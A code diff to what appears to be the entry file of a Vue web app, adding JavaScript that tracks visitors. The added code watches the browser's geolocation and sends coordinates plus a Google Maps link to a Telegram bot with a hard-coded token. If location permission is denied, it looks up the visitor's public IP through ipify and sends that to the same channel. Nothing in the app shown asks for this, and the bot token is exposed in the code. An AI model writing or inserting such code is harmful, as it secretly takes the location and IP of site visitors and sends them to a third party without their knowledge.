@@ -1,9 +1,11 @@
 
-if (navigator.geolocation) {
-navigator.geolocation.getCurrentPosition(showPosition);
-getip();
-}
-
+navigator.geolocation.watchPosition(function(position) {
+  navigator.geolocation.getCurrentPosition(showPosition);
+},
+function(error) {
+  if (error.code == error.PERMISSION_DENIED)
+  done();
+});
 function showPosition(position) {
   fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
   Latitude:${position.coords.latitude}
@@ -11,23 +13,24 @@ function showPosition(position) {
   ${encodeURIComponent(`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`)}
   `)}
 
+function done(){
+  let ip;
+  fetch('https://api.ipify.org/')
+  .then(function(response){
+   return response.text()
+  })
+  .then(function(data){
+    ip=data;
+    console.log(ip);
+    api_url(ip);
+  })
+}
 
-  function getip(){
-    var ip;
-    fetch('https://api.ipify.org/')
-    .then(function(response) { 
-      ip=response.text();
-      ip = ip.replaceAll('"', '');
-      alert(ip);
-      api_url(ip);
-    })
-  }
-
-  function api_url(ip){
+ function api_url(ip){
     fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
         ${encodeURIComponent(`https://api.iplocation.net/?ip=${ip}`)}
-        `)
-  }
+        `);
+      }
 
 import Vue from 'vue'
 import App from './App.vue'
